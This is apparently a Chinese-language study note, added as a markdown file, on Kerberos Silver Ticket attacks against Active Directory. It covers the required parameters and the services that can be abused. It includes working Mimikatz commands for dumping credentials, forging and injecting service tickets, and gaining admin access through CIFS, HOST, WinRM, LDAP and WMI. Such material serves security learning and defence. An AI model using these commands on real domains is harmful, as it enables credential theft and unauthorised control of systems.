@@ -1,0 +1,230 @@
+0x00介绍
+白银票据是伪造Kerberons票证授予服务（TGS）的票，也称为服务票据。白银票据与环境票据不一样的是，白银票据没有与域控进行通信，白银票据只能单一访问某个服务。
+
+0x01特点
+1.白银票据是一个有效的票据授予服务（TGS），因为Kerberons验证服务运行的每台服务器都对服务器主体名称的服务账户进行加密签名
+2.黄金票据是伪造TGT并且获得任何Kerberons服务，而白银票据是伪造（TGS）Kerberons票据，这意味着白银票据仅限于特定服务器上的任何服务
+3.大多数服务不验证PAC（通过将PAC校验和发送到域控进行PAC验证），因此使用服务账户密码哈希生成有效TGS可以完全伪造PAC
+4.攻击者需要服务账户密码哈希值
+5.TGS是伪造的，所有没有和TGT通信，这意味着DC验证过
+6.任何事件日志都在目标服务器上
+
+0x02要求
+1.域名
+2.域的SID
+3.域用户
+4.目标服务器的域名全称，此处为域控的全称
+5.用户ID（可选，管理员ID为500）
+6.运行在目标服务器上的kerberons服务，入mssql，http，cifs
+7.服务的NTLM散列（计算机用户或用户账户）
+
+命令例子：kerberons::golden /user:Haqksd /domain:haq.com /sid:S-1-5-21-2289215397-288801521-4019949533-1000  /tarfet:yk.haq.com /service:cifs /rc4:d5304f9ea69523479560ca4ebb5a2155 /pt
+
+0x03引用文章的具体例子
+文章地址：https://www.cnblogs.com/backlion/p/8119013.html
+/domain –完整的域名称，如：lab.adsecurity.org
+
+/sid –域的SID，如：S-1-5-21-1473643419-774954089-2222329127
+
+/user – 域用户名
+
+/ groups（可选） - 用户所属的组RID
+
+/ ticket（可选） - 提供一个路径和名称，用于保存Golden Ticket文件以便日后使用，或者使用/ ptt立即将黄金票据插入到内存中以供使用
+
+ /ptt - 作为/ ticket的替代品，使用它来立即将伪造的票据插入到内存中以供使用。
+
+/ id（可选） - 用户RID，Mimikatz默认值是500（默认管理员帐户RID）
+
+/ startoffset（可选） - 票证可用时的起始偏移（如果使用此选项，通常设置为-10或0）Mimikatz默认值是0
+
+/ endin（可选） - 票据有效时间，Mimikatz默认值是10年，Active Directory默认Kerberos策略设置为10小时
+
+/ renewmax（可选） - 续订最长票据有效时间，Mimikatz默认值是10年，Active Directory默认Kerberos策略设置为最长为7天
+
+1.白银票据需要的参数
+/target –目标服务器的FQDN
+
+FQDN：(Fully Qualified Domain Name)全限定域名：同时带有主机名和域名的名称。（通过符号“.”）
+
+/service –运行在目标服务器上的kerberos服务，该服务主体名称类型如cifs，http，mssql等
+
+/rc4 –服务的NTLM散列（计算机帐户或用户帐户）
+
+2.白银票据默认组
+域用户SID：S-1-5-21 <DOMAINID> -513
+
+域管理员SID：S-1-5-21 <DOMAINID> -512
+
+架构管理员SID：S-1-5-21 <DOMAINID> -518
+
+企业管理员SID：S-1-5-21 <DOMAINID> -519
+
+组策略创建所有者SID：S-1-5-21 <DOMAINID> -520
+
+3. Mimikatz命令创建白银票据
+以下Mimikatz命令会在服务器adsmswin2k8r2.lab.adsecurity.org上为CIFS服务创建白银票据。为了成功创建Silver Ticket，需要从AD域转储中或在本地系统上运行Mimikatz来获获取adsmswin2k8r2.lab.adsecurity.org中AD计算机帐户密码哈希值。NTLM密码哈希与 rc4参数一起使用。服务SPN类型也需要在/ service参数中标识。目标计算机的FQDA需要在/ target参数中使用以及/ sid参数中的域SID。命令如下：
+
+mimikatz “kerberos::golden /user:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt” exit 
+
+ 
+
+ 
+
+ 
+
+0x05 白银票据在各种服务中的实列
+  1.白银票据的服务列表
+ Service Type	 Service Silver Tickets
+WMI	 HOST
+RPCSS
+PowerShell Remoting
+
+ HOST
+HTTP
+WinRM	 HOST
+HTTP
+Scheduled Tasks	 HOST
+ Windows File Share (CIFS)	 CIFS
+ LDAP operations including
+
+Mimikatz DCSync
+
+ LDAP
+ Windows Remote Server Administration Tools	 RPCSS
+LDAP
+CIFS
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+
+ 
+ 
+ 
+
+2.Windows共享（CIFS）管理访问的银票
+为“ cifs ”服务创建白银票据，以获得目标计算机上任何Windows共享的管理权限。
+
+注入CIFS Silver Ticket后，我们现在可以访问目标计算机上的任何共享，包括
+
+c $共享，我们能够将文件拷贝到共享文件中。
+
+ 
+
+ 
+
+
+ 3.具有管理员权限的Windows计算机（HOST）白银票据
+创建银票以获得目标计算机上所涵盖的任何Windows服务的管理员权限。这包括修改和创建计划任务的权限。
+
+ 
+
+利用HOST Silver Ticket，我们可以创建一个新的计划任务。
+
+ 
+
+ 
+
+或者通过利用HOST Silver Ticket，我们可以修改存在的计划任务。
+
+ 
+
+
+
+ 
+
+ 
+
+ 4.Silver Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行
+为“ http ”服务和“ wsman ”服务创建Silver Ticket，以获得目标系统上的WinRM和或PowerShell Remoting的管理权限。
+
+ 
+
+
+
+注入两张HTTP＆WSMAN白银票据后，我们可以使用PowerShell远程（或WinRM的）反弹出目标系统shell。首先New-PSSession使用PowerShell创建到远程系统的会话的PowerShell cmdlet，然后Enter-PSSession打开远程shell。
+
+ 
+
+
+
+ 5.白银票据证连接到具有管理员权限Windows计算机上的LDAP
+为“ ldap ”服务创建Silver Ticket 以获得目标系统（包括Active Directory）上LDAP服务的管理权限。
+
+ 
+
+利用LDAP Silver Ticket，我们可以远程访问LDAP服务来获得krbtgt的信息
+
+
+
+注：lsadump::dcsync
+
+向 DC 发起一个同步对象（可获取帐户的密码信息）的质询。需要的权限包括管理员组（Administrators），域管理员组（ Domain Admins）或企业管理员组（Enterprise Admins）以及域控制器的计算机帐户，只读域控制器默认不允许读取用户密码数据。
+
+ 6.白银票据证连接到具有管理员权限Windows计算机上的WMI
+ 为“ HOST ”服务和“ rpcss ”服务创建白银票据，以使用WMI在目标系统上远程执行命令。
+
+ 
+
+注入这些白银票据之后，我们可以通过运行“klist”来确认Kerberos TGS票据在内存中注入白银票据后，我们可以通过“传票”来调用WMIC或Invoke-WmiMethod在目标系统上运行命令。
+
+ 
+
+Invoke-WmiMethod win32_process -ComputerName $ Computer -Credential $ Creds -name create -argumentlist“$ RunCommand”
+
+
+
+ 
+
+  7.访问域控上“cifs”服务实列
+首先需要获得如下信息：
+
+/domain
+
+/sid
+
+/target:目标服务器的域名全称，此处为域控的全称
+
+/service：目标服务器上面的kerberos服务，此处为cifs
+
+/rc4：计算机账户的NTLM hash，域控主机的计算机账户
+
+/user：要伪造的用户名，此处可用silver测试
+
+在域控上执行如下命令来获取域控主机的本地管理员账户hash
+
+mimikatz log "sekurlsa::logonpasswords"
+
+如图:
+
+ 
+
+ 
+
+注：
+
+此处要找到计算机账户，也就是Username : WIN-8VVLRPIAJB0$的NTLM hash，如果是其他账户，那么会失败,也就是需要共享服务账号。
+
+整理以上获得的信息如下：
+
+/domain:test.local
+
+/sid:S-1-5-21-4155807533-921486164-2767329826
+
+/target:WIN-8VVLRPIAJB0.test.local
+
+/service:cifs
+
+/rc4:d5304f9ea69523479560ca4ebb5a2155
+
+/user:silver
+
+使用mimikatz执行如下命令导入Silver Ticket
+
+mimikatz "kerberos::golden /domain:test.local /sid:S-1-5-21-4155807533-921486164-2767329826 /target:WIN-8VVLRPIAJB0.test.local /service:cifs /rc4:d5304f9ea69523479560ca4ebb5a2155 /user:silver /ptt"
+
+如图，成功导入，此时可以成功访问域控上的文件共享
